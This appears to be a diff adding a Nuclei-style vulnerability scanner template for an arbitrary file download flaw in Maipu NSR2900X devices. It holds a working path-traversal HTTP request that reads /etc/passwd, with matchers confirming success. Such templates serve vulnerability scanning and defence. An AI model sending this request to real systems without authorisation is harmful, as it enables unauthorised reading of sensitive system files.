@@ -1,0 +1,27 @@
+id: maipu-nsr2900x-file-download
+info:
+  name: Maipu NSR2900X Arbitrary File Download
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Maipu configuration management system has an arbitrary file download vulnerability that can be exploited to obtain sensitive information from the system.
+  tags: file-read
+http:
+  - raw:
+      - |
+        GET /DOWNLOAD_FILE/../../../../../../../../../../../../../../../../../../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: identity
+        Connection: close
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "passwd"
+      - type: status
+        status:
+          - 200
